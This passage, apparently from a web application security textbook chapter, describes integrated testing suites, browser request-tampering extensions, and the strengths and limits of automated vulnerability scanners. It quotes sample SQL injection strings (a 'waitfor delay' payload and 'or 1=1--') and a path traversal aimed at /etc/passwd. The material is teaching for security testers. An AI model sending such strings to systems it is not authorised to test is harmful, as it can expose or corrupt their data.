guide the scanner‚Äôs coverage using your browser and receive quick feedback about each request you make, without needing to manually identify 
the requests you want to scan. Figure 20-10 shows the results of a live 
scanning exercise.
c20.indd 764 c20.indd 764 8/19/2011 12:21:07 PM 8/19/2011 12:21:07 PM
Stuttard c20.indd V3 - 08/16/2011 Page 765
 Chapter 20 n A Web Application Hacker‚Äôs Toolkit 765
Figure 20-10: The results of live scanning as you browse with Burp Scanner
Although the scanners in integrated testing suites are designed to be used in a 
different way than standalone scanners, in some cases the core scanning engine 
is highly capable and compares favorably with those of the leading standalone 
scanners, as described later in this chapter.
Manual Request Tools
The manual request component of the integrated testing suites provides the basic 
facility to issue a single request and view its response. Although simple, this 
function is often benefi cial when you are probing a tentative vulnerability and 
need to reissue the same request manually several times, tweaking elements of 
the request to determine the effect on the application‚Äôs behavior. Of course, you 
could perform this task using a standalone tool such as Netcat, but having the 
c20.indd 765 c20.indd 765 8/19/2011 12:21:07 PM 8/19/2011 12:21:07 PM
Stuttard c20.indd V3 - 08/16/2011 Page 766
766 Chapter 20 n A Web Application Hacker‚Äôs Toolkit 
function built in to the suite means that you can quickly retrieve an interesting 
request from another component (proxy, spider, or fuzzer) for manual investigation. It also means that the manual request tool benefi ts from the various shared 
functions implemented within the suite, such as HTML rendering, support for 
upstream proxies and authentication, and automatic updating of the ContentLength header. Figure 20-11 shows a request being reissued manually.
Figure 20-11: A request being reissued manually using Burp Repeater
The following features are often implemented within manual request tools:
n Integration with other suite components, and the ability to refer any request 
to and from other components for further investigation
n A history of all requests and responses, keeping a full record of all manual 
requests for further review, and enabling a previously modifi ed request 
to be retrieved for further analysis
c20.indd 766 c20.indd 766 8/19/2011 12:21:08 PM 8/19/2011 12:21:08 PM
Stuttard c20.indd V3 - 08/16/2011 Page 767
 Chapter 20 n A Web Application Hacker‚Äôs Toolkit 767
n A multitabbed interface, letting you work on several different items at once
n The ability to automatically follow redirections
Session Token Analyzers
Some testing suites include functions to analyze the randomness properties of session cookies and other tokens used within the application where 
there is a need for unpredictability. Burp Sequencer is a powerful tool that 
performs standard statistical tests for randomness on an arbitrarily sized 
sample of tokens and provides fi ne-grained results in an accessible format. 
Burp Sequencer is shown in Figure 20-12 and is described in more detail in 
Chapter 7.
Figure 20-12: Using Burp Sequencer to test the randomness properties of an 
application‚Äôs session token
c20.indd 767 c20.indd 767 8/19/2011 12:21:08 PM 8/19/2011 12:21:08 PM
Stuttard c20.indd V3 - 08/16/2011 Page 768
768 Chapter 20 n A Web Application Hacker‚Äôs Toolkit 
Shared Functions and Utilities
In addition to their core tool components, integrated test suites provide a wealth 
of other value-added features that address specifi c needs that arise when you are 
attacking a web application and that enable the other tools to work in unusual 
situations. The following features are implemented by the different suites:
n Analysis of HTTP message structure, including parsing of headers and 
request parameters, and unpacking of common serialization formats (see 
Figure 20-13)
n Rendering of HTML content in responses as it would appear within the 
browser
n The ability to display and edit messages in text and hexadecimal form
n Search functions within all requests and responses
n Automatic updating of the HTTP Content-Length header following any 
manual editing of message contents
n Built-in encoders and decoders for various schemes, enabling quick analysis 
of application data in cookies and other parameters
n A function to compare two responses and highlight the differences
n Features for automated content discovery and attack surface analysis
n The ability to save to disk the current testing session and retrieve saved 
sessions
n Support for upstream web proxies and SOCKS proxies, enabling you to 
chain together different tools or access an application via the proxy server 
used by your organization or ISP
n Features to handle application sessions, login, and request tokens, allowing you to continue using manual and automated techniques when faced 
with unusual or highly defensive session-handling mechanisms
n In-tool support for HTTP authentication methods, enabling you to use 
all the suite‚Äôs features in environments where these are used, such as 
corporate LANs
n Support for client SSL certifi cates, enabling you to attack applications 
that employ these
n Handling of the more obscure features of HTTP, such as gzip content 
encoding, chunked transfer encoding, and status 100 interim responses
n Extensibility, enabling the built-in functionality to be modifi ed and extended 
in arbitrary ways by third-party code
n The ability to schedule common tasks, such as spidering and scanning, 
allowing you to start the working day asleep
c20.indd 768 c20.indd 768 8/19/2011 12:21:08 PM 8/19/2011 12:21:08 PM
Stuttard c20.indd V3 - 08/16/2011 Page 769
 Chapter 20 n A Web Application Hacker‚Äôs Toolkit 769
n Persistent confi guration of tool options, enabling a particular setup to be 
resumed on the next execution of the suite
n Platform independence, enabling the tools to run on all popular operating systems
Figure 20-13: Requests and responses can be analyzed into their HTTP 
structure and parameters
Testing Work Flow
Figure 20-14 shows a typical work fl ow for using an integrated testing suite. 
The key steps involved in each element of the testing are described in detail 
throughout this book and are collated in the methodology set out in Chapter 21. 
The work fl ow described here shows how the different components of the testing suite fi t into that methodology.
In this work fl ow, you drive the overall testing process using your browser. 
As you browse the application via the intercepting proxy, the suite compiles 
two key repositories of information:
n The proxy history records every request and response passing through 
the proxy.
n The site map records all discovered items in a directory tree view of the 
target.
(Note that in both cases, the default display fi lters may hide from view some 
items that are not normally of interest when testing.)
As described in Chapter 4, as you browse the application, the testing suite 
typically performs passive spidering of discovered content. This updates the site 
map with all requests passing through the proxy. It also adds items that have 
c20.indd 769 c20.indd 769 8/19/2011 12:21:08 PM 8/19/2011 12:21:08 PM
Stuttard c20.indd V3 - 08/16/2011 Page 770
770 Chapter 20 n A Web Application Hacker‚Äôs Toolkit 
been identifi ed based on the contents of responses passing through the proxy 
(by parsing links, forms, scripts, and so on). After you have manually mapped 
the application‚Äôs visible content using your browser, you may additionally use 
the Spider and Content Discovery functions to actively probe the application for 
additional content. The outputs from these tools are also added to the site map.
Figure 20-14: A typical work flow for using an integrated testing suite
Web
browser
Proxy history
Intercepting
proxy
Spider active
spidering
active
discovery
Site map
Content
discovery
Token
analyzer Scanner Repeater Fuzzer
Recon and analysis
Vulnerability detection
and exploitation
attack surface
passive
spidering
passive
scanning
confirm some
vulnerabilities
in browser
Vulnerabilities
When you have mapped the application‚Äôs content and functionality, you can 
assess its attack surface. This is the set of functionality and requests that warrants closer inspection in an attempt to fi nd and exploit vulnerabilities.
When testing for vulnerabilities, you typically select items from the proxy 
interception window, proxy history, or site map, and send these to other tools 
within the suite to perform specifi c tasks. As we have described, you can use the 
fuzzing tool to probe for input-based vulnerabilities and deliver other attacks 
such as harvesting sensitive information. You can use the vulnerability scanner to automatically check for common vulnerabilities, using both passive and 
c20.indd 770 c20.indd 770 8/19/2011 12:21:09 PM 8/19/2011 12:21:09 PM
Stuttard c20.indd V3 - 08/16/2011 Page 771
 Chapter 20 n A Web Application Hacker‚Äôs Toolkit 771
active techniques. You can use the token analyzer tool to test the randomness 
properties of session cookies and other tokens. And you can use the request 
repeater to modify and reissue an individual request repeatedly to probe for 
vulnerabilities or exploit bugs you have already discovered. Often you will pass 
individual items back and forth between these different tools. For example, 
you may select an interesting item from a fuzzing attack, or an issue reported 
by the vulnerability scanner, and pass this to the request repeater to verify the 
vulnerability or refi ne an exploit.
For many types of vulnerabilities, you will typically need to go back to your 
browser to investigate an issue further, confi rm whether an apparent vulnerability is genuine, or test a working exploit. For example, having found a cross-site 
scripting fl aw using the vulnerability scanner or request repeater, you may paste 
the resulting URL back into your browser to confi rm that your proof-of-concept 
exploit is executed. When testing possible access control bugs, you may view 
the results of particular requests in your current browser session to confi rm the 
results within a specifi c user context. If you discover a SQL injection fl aw that 
can be used to extract large amounts of information, you might revert to your 
browser as the most useful location to display the results.
You should not regard the work fl ow described here as in any way rigid or 
restrictive. In many situations, you may test for bugs by entering unexpected 
input directly into your browser or into the proxy interception window. Some 
bugs may be immediately evident in requests and responses without the need to 
involve any more attack-focused tools. You may bring in other tools for particular 
purposes. You also may combine the components of the testing suite in innovative ways that are not described here and maybe were not even envisioned by 
the tool‚Äôs author. Integrated testing suites are hugely powerful creations, with 
numerous interrelated features. The more creative you can be when using them, 
the more likely you are to discover the most obscure vulnerabilities!
Alternatives to the Intercepting Proxy
One item that you should always have available in your toolkit is an alternative 
to the usual proxy-based tools for the rare situations in which they cannot be 
used. Such situations typically arise when you need to use some nonstandard 
authentication method to access the application, either directly or via a corporate 
proxy, or where the application uses an unusual client SSL certifi cate or browser 
extension. In these cases, because an intercepting proxy interrupts the HTTP 
connection between client and server, you may fi nd that the tool prevents you 
from using some or all of the application‚Äôs functionality.
The standard alternative approach in these situations is to use an in-browser 
tool to monitor and manipulate the HTTP requests generated by your browser. 
It remains the case that everything that occurs on the client, and all data submitted to the server, is in principle under your full control. If you so desired, 
you could write your own fully customized browser to perform any task you 
c20.indd 771 c20.indd 771 8/19/2011 12:21:09 PM 8/19/2011 12:21:09 PM
Stuttard c20.indd V3 - 08/16/2011 Page 772
772 Chapter 20 n A Web Application Hacker‚Äôs Toolkit 
required. What these browser extensions do is provide a quick and easy way to 
instrument the functionality of a standard browser without interfering with the 
network-layer communications between the browser and server. This approach 
therefore enables you to submit arbitrary requests to the application while 
allowing the browser to use its normal means of communicating with the 
problematic application.
Numerous extensions are available for both Internet Explorer and Firefox 
that implement broadly similar functionality. We will illustrate one example 
of each. We recommend that you experiment with various options to fi nd the 
one that best suits you.
You should note that the functionality of the existing browser extensions is 
very limited in comparison to the main tool suites. They do not perform any 
spidering, fuzzing, or vulnerability scanning, and you are restricted to working 
completely manually. Nevertheless, in situations where you are forced to use 
them, they will enable you to perform a comprehensive attack on your target 
that would not be possible using only a standard browser.
Tamper Data
Tamper Data, shown in Figure 20-15, is an extension to the Firefox browser. 
Anytime you submit a form, Tamper Data displays a pop-up showing all the 
request details, including HTTP headers and parameters, which you can view 
and modify.
Figure 20-15: Tamper Data lets you modify HTTP request details within Firefox
TamperIE
TamperIE, shown in Figure 20-16, implements essentially the same functionality 
within the Internet Explorer browser as Tamper Data does on Firefox.
c20.indd 772 c20.indd 772 8/19/2011 12:21:09 PM 8/19/2011 12:21:09 PM
Stuttard c20.indd V3 - 08/16/2011 Page 773
 Chapter 20 n A Web Application Hacker‚Äôs Toolkit 773
Figure 20-16: TamperIE lets you modify HTTP request details 
within Internet Explorer
Standalone Vulnerability Scanners
A number of different tools exist for performing completely automated vulnerability scans of web applications. These scanners have the benefi t of being able 
to test a large amount of functionality in a relatively short time. In a typical 
application they often can identify a variety of important vulnerabilities.
Standalone web application vulnerability scanners automate several of the 
techniques we have described in this book, including application spidering, 
discovery of default and common content, and probing for common vulnerabilities. Having mapped the application‚Äôs content, the scanner works through 
its functionality, submitting a range of test strings within each parameter 
of each request, and analyzes the application‚Äôs responses for signatures of 
common vulnerabilities. The scanner produces a report describing each of 
the vulnerabilities it has discovered. This report usually includes the specifi c 
request and response that the application used to diagnose each reported 
vulnerability, enabling a knowledgeable user to manually investigate and 
confi rm the bug‚Äôs existence.
A key requirement when you are deciding whether and when to use a 
vulnerability scanner is to understand the inherent strengths and weaknesses of these types of tools and the challenges that need to be addressed 
in the course of developing them. These considerations also affect how you 
can effectively make use of an automated scanner and how to interpret and 
rely on its results.
c20.indd 773 c20.indd 773 8/19/2011 12:21:09 PM 8/19/2011 12:21:09 PM
Stuttard c20.indd V3 - 08/16/2011 Page 774
774 Chapter 20 n A Web Application Hacker‚Äôs Toolkit 
Vulnerabilities Detected by Scanners
Several categories of common vulnerabilities can be detected by scanners with 
a degree of reliability. These are vulnerabilities with a fairly standard signature. 
In some cases, the signature exists within the application‚Äôs normal requests and 
responses. In other cases, the scanner sends a crafted request designed to trigger the signature if the vulnerability is present. If the signature appears in the 
application‚Äôs response to the request, the scanner infers that the vulnerability 
is present.
Here are some examples of vulnerabilities that can be detected in this way:
n Refl ected cross-site scripting vulnerabilities arise when user-supplied input 
is echoed in the application‚Äôs responses without appropriate sanitization. 
Automated scanners typically send test strings containing HTML markup 
and search the responses for these strings, enabling them to detect many 
of these fl aws.
n Some SQL injection vulnerabilities can be detected via a signature. For 
example, submitting a single quotation mark may result in an ODBC error 
message, or submitting the string ‚Äò; waitfor delay ‚Äò0:0:30‚Äô-- may 
result in a time delay.
n Some path traversal vulnerabilities can be detected by submitting a traversal sequence targeting a known fi le such as win.ini or /etc/passwd
and searching the response for the appearance of this fi le.
n Some command injection vulnerabilities can be detected by injecting a 
command that causes a time delay or echoes a specifi c string into the 
application‚Äôs response.
n Straightforward directory listings can be identifi ed by requesting the 
directory path and looking for a response containing text that looks like 
a directory listing.
n Vulnerabilities such as cleartext password submission, liberally scoped 
cookies, and forms with autocomplete enabled can be reliably detected 
by reviewing the normal requests and responses the application makes.
n Items not linked from the main published content, such as backup fi les 
and source fi les, can often be discovered by requesting each enumerated 
resource with a different fi le extension.
In many of these cases, some instances of the same category of vulnerability 
cannot be reliably detected using a standard attack string and signature. For 
example, with many input-based vulnerabilities, the application implements some 
rudimentary input validation that can be circumvented using crafted input. The 
usual attack strings may be blocked or sanitized; however, a skilled attacker can 
probe the input validation in place and discover a bypass to it. In other cases, 
c20.indd 774 c20.indd 774 8/19/2011 12:21:09 PM 8/19/2011 12:21:09 PM
Stuttard c20.indd V3 - 08/16/2011 Page 775
 Chapter 20 n A Web Application Hacker‚Äôs Toolkit 775
a vulnerability may be triggered by standard strings but may not result in the 
expected signature. For example, many SQL injection attacks do not result in any 
data or error messages being returned to the user, and a path traversal vulnerability may not result in the contents of the targeted fi le being directly returned 
in the application‚Äôs response. In some of these cases, a sophisticated scanner may 
still be able to identify the vulnerability, or at least note some anomalous behavior 
for manual investigation, but this is not feasible in all cases.
Furthermore, several important categories of vulnerabilities do not have a standard signature and cannot be probed for using a standard set of attack strings. 
In general, automated scanners are ineffective at discovering defects of this kind. 
Here are some examples of vulnerabilities that scanners cannot reliably detect:
n Broken access controls, which enable a user to access other users‚Äô data, 
or a low-privileged user to access administrative functionality. A scanner does not understand the access control requirements relevant to the 
application, nor can it assess the signifi cance of the different functions 
and data it discovers using a particular user account.
n Attacks that involve modifying a parameter‚Äôs value in a way that has 
meaning within the application ‚Äî for example, a hidden fi eld representing 
the price of a purchased item or the status of an order. A scanner does not 
understand the meaning that any parameter has within the application‚Äôs 
functionality.
n Other logic fl aws, such as beating a transaction limit using a negative 
value, or bypassing a stage of an account recovery process by omitting a 
key request parameter.
n Vulnerabilities in the design of application functionality, such as weak 
password quality rules, the ability to enumerate usernames from login 
failure messages, and easily guessable forgotten-password hints.
n Session hijacking attacks in which a sequence can be detected in the application‚Äôs session tokens, enabling an attacker to masquerade as other users. 
Even if a scanner can recognize that a particular parameter has a predictable value across successive logins, it will not understand the signifi cance 
of the different content that results from modifying that parameter.
n Leakage of sensitive information such as listings of usernames and logs 
containing session tokens.
Some vulnerability scanners attempt to check for some of these vulnerabilities. 
For example, some scanners attempt to locate access control bugs by logging 
into an application in two different user contexts and trying to identify data 
and functions that one user can access without proper authorization. In the 
authors‚Äô experience, checks such as these typically generate a huge number of 
false positive and false negative results.
c20.indd 775 c20.indd 775 8/19/2011 12:21:10 PM 8/19/2011 12:21:10 PM
Stuttard c20.indd V3 - 08/16/2011 Page 776
776 Chapter 20 n A Web Application Hacker‚Äôs Toolkit 
Within the previous two listings of vulnerabilities, each list contains defects 
that may be classifi ed as low-hanging fruit ‚Äî those that can be easily detected 
and exploited by an attacker with modest skills. Hence, although an automated 
scanner will often detect a decent proportion of the low-hanging fruit within 
an application, it will also typically miss a signifi cant number of these problems ‚Äî including some low-hanging fruit that any manual attack would detect! 
Getting a clean bill of health from an automated scanner never provides any 
solid assurance that the application does not contain some serious vulnerabilities 
that can be easily found and exploited.
It is also fair to say that in the more security-critical applications that currently exist, which have been subjected to more stringent security requirements 
and testing, the vulnerabilities that remain tend to be those appearing on the 
second list, rather than the fi rst.
Inherent Limitations of Scanners
The best vulnerability scanners on the market were designed and implemented 
by experts who have given serious thought to the possible ways in which all 
kinds of web application vulnerabilities can be detected. It is no accident that 
the resulting scanners remain unable to reliably detect many categories of vulnerabilities. A fully automated approach to web application testing presents 
various inherent barriers. These barriers can be effectively addressed only by 
systems with full-blown artifi cial intelligence engines, going far beyond the 
capabilities of today‚Äôs scanners.
Every Web Application Is Different
Web applications differ starkly from the domain of networks and infrastructures, in which a typical installation employs off-the-shelf products in more 
or less standard confi gurations. In the case of network infrastructure, it is 
possible in principle to construct in advance a database of all possible targets 
and create a tool to probe for every associated defect. This is not possible 
with customized web applications, so any effective scanner must expect the 
unexpected.
Scanners Operate on Syntax
Computers can easily analyze the syntactic content of application responses 
and can recognize common error messages, HTTP status codes, and usersupplied data being copied into web pages. However, today‚Äôs scanners cannot 
understand the semantic meaning of this content, nor can they make normative judgments on the basis of this meaning. For example, in a function that 
updates a shopping cart, a scanner simply sees numerous parameters being 
c20.indd 776 c20.indd 776 8/19/2011 12:21:10 PM 8/19/2011 12:21:10 PM
Stuttard c20.indd V3 - 08/16/2011 Page 777
 Chapter 20 n A Web Application Hacker‚Äôs Toolkit 777
submitted. It doesn‚Äôt know that one of these parameters signifi es a quantity 
and another signifi es a price. Furthermore, it doesn‚Äôt know that being able to 
modify an order‚Äôs quantity is inconsequential, whereas being able to modify 
its price represents a security fl aw.
Scanners Do Not Improvise
Many web applications use nonstandard mechanisms to handle sessions and 
navigation and to transmit and handle data, such as in the structure of the 
query string, cookies, or other parameters. A human being may quickly notice 
and deconstruct the unusual mechanism, but a computer will continue following the standard rules it has been given. Furthermore, many attacks against 
web applications require some improvisation, such as to circumvent partially 
effective input fi lters or to exploit several different aspects of the application‚Äôs 
behavior that collectively leave it open to attack. Scanners typically miss these 
kinds of attacks.
Scanners Are Not Intuitive
Computers do not have intuition about how best to proceed. The approach of 
today‚Äôs scanners is largely to attempt every attack against every function. This 
imposes a practical limit on the variety of checks that can be performed and the 
ways in which these can be combined. This approach overlooks vulnerabilities 
in many cases:
n Some attacks involve submitting crafted input at one or more steps of a 
multistage process and walking through the rest of the process to observe 
the results.
n Some attacks involve changing the sequence of steps in which the application expects a process to be performed.
n Some attacks involve changing the value of multiple parameters in crafted 
ways. For example, an XSS attack may require a specifi c value to be placed 
into one parameter to cause an error message, and an XSS payload to be 
placed into another parameter, which is copied into the error message.
Because of the practical constraints imposed on scanners‚Äô brute-force approach 
to vulnerability detection, they cannot work through every permutation of 
attack string in different parameters, or every permutation of functional steps. 
Of course, no human being can do this practically either. However, a human 
frequently has a feel for where the bugs are located, where the developer made 
assumptions, and where something doesn‚Äôt ‚Äúlook right.‚Äù Hence, a human tester 
will select a tiny proportion of the total possible attacks for actual investigation 
and thereby will often achieve success.
c20.indd 777 c20.indd 777 8/19/2011 12:21:10 PM 8/19/2011 12:21:10 PM
Stuttard c20.indd V3 - 08/16/2011 Page 778
778 Chapter 20 n A Web Application Hacker‚Äôs Toolkit 
Technical Challenges Faced by Scanners
The barriers to automation described previously lead to a number of specifi c 
technical challenges that must be addressed in the creation of an effective 
vulnerability scanner. These challenges affect not only the scanner‚Äôs ability to 
detect specifi c types of vulnerabilities, as already described, but also its ability 
to perform the core tasks of mapping the application‚Äôs content and probing for 
defects.
Some of these challenges are not insuperable, and today‚Äôs scanners have found 
ways of partially addressing them. Scanning is by no means a perfect science, 
however, and the effectiveness of modern scanning techniques varies widely 
from application to application.
Authentication and Session Handling
The scanner must be able to work with the authentication and session-handling 
mechanisms used by different applications. Frequently, the majority of an application‚Äôs functionality can only be accessed using an authenticated session, and a 
scanner that fails to operate using such a session will miss many detectable fl aws.
In current scanners, the authentication part of this problem is addressed by 
allowing the user of the scanner to provide a login script or to walk through the 
authentication process using a built-in browser, enabling the scanner to observe 
the specifi c steps involved in obtaining an authenticated session.
The session-handling part of the challenge is less straightforward to address 
and comprises the following two problems:
n The scanner must be able to interact with whatever session-handling 
mechanism the application uses. This may involve transmitting a session 
token in a cookie, in a hidden form fi eld, or within the URL query string. 
Tokens may be static throughout the session or may change on a per-request 
basis, or the application may employ a different custom mechanism.
n The scanner must be able to detect when its session has ceased to be valid 
so that it can return to the authentication stage to acquire a new one. This 
may occur for various reasons. Perhaps the scanner has requested the logout 
function, or the application has terminated the session because the scanner has performed abnormal navigation or has submitted invalid input. 
The scanner must detect this both during its initial mapping exercises 
and during its subsequent probing for vulnerabilities. Different applications behave in very different ways when a session becomes invalid. For a 
scanner that only analyzes the syntactic content of application responses, 
this may be a diffi cult challenge to meet in general, particularly if a nonstandard session-handling mechanism is used.
c20.indd 778 c20.indd 778 8/19/2011 12:21:10 PM 8/19/2011 12:21:10 PM
Stuttard c20.indd V3 - 08/16/2011 Page 779
 Chapter 20 n A Web Application Hacker‚Äôs Toolkit 779
It is fair to say that some of today‚Äôs scanners do a reasonable job of working 
with the majority of authentication and session-handling mechanisms that are 
in use. However, there remain numerous cases where scanners struggle. As 
a result, they may fail to properly crawl or scan key parts of an application‚Äôs 
attack surface. Because of the fully automated way in which standalone scanners operate, this failure normally is not apparent to the user.
Dangerous Effects
In many applications, running an unrestricted automated scan without any user 
guidance may be quite dangerous to the application and the data it contains. 
For example, a scanner may discover an administration page that contains 
functions to reset user passwords, delete accounts, and so on. If the scanner 
blindly requests every function, this may result in access being denied to all 
users of the application. Similarly, the scanner may discover a vulnerability 
that can be exploited to seriously corrupt the data held within the application. 
For example, in some SQL injection vulnerabilities, submitting standard SQL 
attack strings such as or 1=1-- causes unforeseen operations to be performed 
on the application‚Äôs data. A human being who understands the purpose of a 
particular function may proceed with caution for this reason, but an automated 
scanner lacks this understanding.
Individuating Functionality
There are many situations in which a purely syntactic analysis of an application 
fails to correctly identify its core set of individual functions:
n Some applications contain a colossal quantity of content that embodies 
the same core set of functionality. For example, applications such as eBay, 
MySpace, and Amazon contain millions of different application pages 
with different URLs and content, yet these correspond to a relatively small 
number of actual application functions.
n Some applications may have no fi nite boundary when analyzed from a 
purely syntactic perspective. For example, a calendar application may 
allow users to navigate to any date. Similarly, some applications with a 
fi nite amount of content employ volatile URLs or request parameters to 
access the same content on different occasions, leading scanners to continue mapping indefi nitely.
n The scanner‚Äôs own actions may result in the appearance of seemingly new 
content. For example, submitting a form may cause a new link to appear 
in the application‚Äôs interface, and accessing the link may retrieve a further 
form that has the same behavior.
c20.indd 779 c20.indd 779 8/19/2011 12:21:10 PM 8/19/2011 12:21:10 PM
Stuttard c20.indd V3 - 08/16/2011 Page 780
780 Chapter 20 n A Web Application Hacker‚Äôs Toolkit 
In any of these situations, a human attacker can quickly ‚Äúsee through‚Äù the 
application‚Äôs syntactic content and identify the core set of actual functions that 
need to be tested. For an automated scanner with no semantic understanding, 
this is considerably harder to do.
Aside from the obvious problems of mapping and probing the application 
in the situations described, a related problem arises in the reporting of discovered vulnerabilities. A scanner based on purely syntactic analysis is prone to 
generating duplicate fi ndings for each single vulnerability. For example, a scan 
report might identify 200 XSS fl aws, 195 of which arise in the same application 
function that the scanner probed multiple times because it appears in different 
contexts with different syntactic content.
Other Challenges to Automation
As discussed in Chapter 14, some applications implement defensive measures 
specifi cally designed to prevent them from being accessed by automated client 
programs. These measures include reactive session termination in the event of 
anomalous activity and the use of CAPTCHAs and other controls designed to 
ensure that a human being is responsible for particular requests.
In general, the scanner‚Äôs spidering function faces the same challenges as web 
application spiders more generally, such as customized ‚Äúnot found‚Äù responses 
and the ability to interpret client-side code. Many applications implement fi negrained validation over particular items of input, such as the fi elds on a user 
registration form. If the spider populates the form with invalid input and is 
unable to understand the error messages generated by the application, it may 
never proceed beyond this form to some important functions lying behind it.
The rapid evolution of web technologies, particularly the use of browser 
extension components and other frameworks on the client side, means that most 
scanners lag behind the latest trends. This can result in failures to identify all 
the relevant requests made within the application, or the precise format and 
contents of requests that the application requires.
Furthermore, the highly stateful nature of today‚Äôs web applications, with 
complex data being held on both the client and server side, and updated via 
asynchronous communications between the two, creates problems for most fully 
automated scanners, which tend to work on each request in isolation. To gain 
complete coverage of these applications, it is often necessary to understand the 
multistage request processes that they involve and to ensure that the application 
is in the desired state to handle a particular attack request. Chapter 14 describes 
techniques for achieving this within custom automated attacks. They generally 
c20.indd 780 c20.indd 780 8/19/2011 12:21:10 PM 8/19/2011 12:21:10 PM
Stuttard c20.indd V3 - 08/16/2011 Page 781
 Chapter 20 n A Web Application Hacker‚Äôs Toolkit 781
require intelligent human involvement to understand the requirements, confi gure 
the testing tools appropriately, and monitor their performance.
Current Products
The market for automated web scanners has thrived in recent years, with a great 
deal of innovation and a wide range of different products. Here are some of the 
more prominent scanners:
n Acunetix
n AppScan
n Burp Scanner
n Hailstorm
n NetSparker
n N-Stalker
n NTOSpider
n Skipfi sh
n WebInspect
Although most mature scanners share a common core of functionality, they 
have differences in their approaches to detecting different areas of vulnerabilities and in the functionality presented to the user. Public discussions about 
the merits of different scanners often degenerate into mudslinging between 
vendors. Various surveys have been performed to evaluate the performance of 
different scanners in detecting different types of security fl aws. Such surveys 
always involve running the scanners against a small sample of vulnerable code. 
This may limit the extrapolation of the results to the wide range of real-world 
situations in which scanners may be used.
The most effective surveys run each scanner against a wide range of sample 
code that is derived from real-world applications, without giving vendors an 
opportunity to adjust their product to the sample code before the analysis. One 
such academic study by the University of California, Santa Barbara, claims to 
be ‚Äúthe largest evaluation of web application scanners in terms of the number 
of tested tools ... and the class of vulnerabilities analyzed.‚Äù You can download 
the report from the study at the following URL:
www.cs.ucsb.edu/~adoupe/static/black-box-scanners-dimva2010.pdf
c20.indd 781 c20.indd 781 8/19/2011 12:21:10 PM 8/19/2011 12:21:10 PM
Stuttard c20.indd V3 - 08/16/2011 Page 782
782 Chapter 20 n A Web Application Hacker‚Äôs Toolkit 
The main conclusions of this study were as follows:
n Whole classes of vulnerabilities cannot be detected by state-of-the-art scanners, including weak passwords, broken access controls, and logic fl aws.
n The crawling of modern web applications can be a serious challenge for 
today‚Äôs web vulnerability scanners due to incomplete support for common client-side technologies and the complex stateful nature of today‚Äôs 
applications.
n There is no strong correlation between price and capability. Some free or 
very cost-effective scanners perform as well as scanners that cost thousands of dollars.
The study assigned each scanner a score based on its ability to identify different types of vulnerabilities. Table 20-1 shows the overall scores and the price 
of each scanner.
Table 20-1: Vulnerability Detection Performance and Prices of Different Scanners According 
to the UCSB Study
SCANNER SCORE PRICE
Acunetix 14 $4,995 to $6,350
WebInspect 13 $6,000 to $30,000
Burp Scanner 13 $191
N-Stalker 13 $899 to $6,299
AppScan 10 $17,550 to $32,500
w3af 9 Free
Paros 6 Free
HailStorm 6 $10,000
NTOSpider 4 $10,000
MileSCAN 4 $495 to $1,495
Grendel-Scan 3 Free
It should be noted that scanning capabilities have evolved considerably in 
recent years and are likely to continue to do so. Both the performance and 
price of individual scanners are likely to change over time. The UCSB study 
that reported the information shown in Table 20-1 was published in June 2010. 
Because of the relative scarcity of reliable public information about the performance of web vulnerability scanners, it is recommended that you do your 
own research before making any purchase. Most scan vendors provide detailed 
product documentation and free trial editions of their software, which you can 
use to help inform your product selection.
c20.indd 782 c20.indd 782 8/19/2011 12:21:11 PM 8/19/2011 12:21:11 PM
Stuttard c20.indd V3 - 08/16/2011 Page 783
 Chapter 20 n A Web Application Hacker‚Äôs Toolkit 783
Using a Vulnerability Scanner
In real-world situations, the effectiveness of using a vulnerability scanner depends 
largely on the application you are targeting. The inherent strengths and weaknesses that we have described affect different applications in different ways, 
depending on the types of functionality and vulnerabilities they contain.
Of the various kinds of vulnerabilities commonly found within web applications, automated scanners are inherently capable of discovering approximately 
half of these, where a standard signature exists. Within the subset of vulnerability 
types that scanners can detect, they do a good job of identifying individual cases, 
although they miss the more subtle and unusual instances of these. Overall, 
you may expect that running an automated scan will identify some but not all 
of the low-hanging fruit within a typical application.
If you are a novice, or you are attacking a large application and have limited 
time, running an automated scan can bring clear benefi ts. It will quickly identify 
several leads for further manual investigation, enabling you to get an initial 
handle on the application‚Äôs security posture and the types of fl aws that exist. 
It will also provide you with a useful overview of the target application and 
highlight any unusual areas that warrant further detailed attention.
If you are an expert at attacking web applications, and you are serious about 
fi nding as many vulnerabilities as possible within your target, you are all too 
aware of the inherent limitations of vulnerability scanners. Therefore, you will 
not fully trust them to completely cover any individual category of vulnerability. Although the results of a scan will be interesting and will prompt manual 
investigation of specifi c issues, you will typically want to perform a full manual 
test of every area of the application for every type of vulnerability to satisfy 
yourself that the job has been done properly.
In any situation where you employ a vulnerability scanner, you should 
keep in mind some key points to ensure that you make the most effective 
use of it:
n Be aware of the kinds of vulnerabilities that scanners can detect and those 
that they cannot.
n Be familiar with your scanner‚Äôs functionality, and know how to leverage 
its confi guration to be the most effective against a given application.
n Familiarize yourself with the target application before running your scanner so that you can make the most effective use of it.
n Be aware of the risks associated with spidering powerful functionality 
and automatically probing for dangerous bugs.
n Always manually confi rm any potential vulnerabilities reported by the 
scanner.
c20.indd 783 c20.indd 783 8/19/2011 12:21:11 PM 8/19/2011 12:21:11 PM
Stuttard c20.indd V3 - 08/16/2011 Page 784
784 Chapter 20 n A Web Application Hacker‚Äôs Toolkit 
n Be aware that scanners are extremely noisy and leave a signifi cant footprint in the logs of the server and any IDS defenses. Do not use a scanner 
if you want to be stealthy.
Fully Automated Versus User-Directed Scanning
A key consideration in your usage of web scanners is the extent to which you 
want to direct the work done by the scanner. The two extreme use cases in this 
decision are as follows:
n You want to give your scanner the URL for the application, click Go, and 
wait for the results.
n You want to work manually and use a scanner to test individual requests 
in isolation, alongside your manual testing.
Standalone web scanners are geared more toward the fi rst of these use cases. 
The scanners that are incorporated into integrated testing suites are geared 
more toward the second use case. That said, both types of scanners allow you 
to adopt a more hybrid approach if you want to.
For users who are novices at web application security, or who require 
a quick assessment of an application, or who deal with a large number of 
applications on a regular basis, a fully automated scan will provide some 
insight into part of the application‚Äôs attack surface. This may help you make 
an informed decision about what level of more comprehensive testing is 
warranted for the application.
For users who understand how web application security testing is done 
and who know the limitations of total automation, the best way to use a scanner is within an integrated testing suite to support and enhance the manual 
testing process. This approach helps avoid many of the technical challenges 
faced by fully automated scanners. You can guide the scanner using your 
browser to ensure that no key areas of functionality are missed. You can 
directly scan the actual requests generated by the application, containing 
data with the correct content and format that the application requires. With 
full control over what gets scanned, you can avoid dangerous functionality, 
recognize duplicated functionality, and step through any input validation 
requirements that an automated scanner might struggle with. Furthermore, 
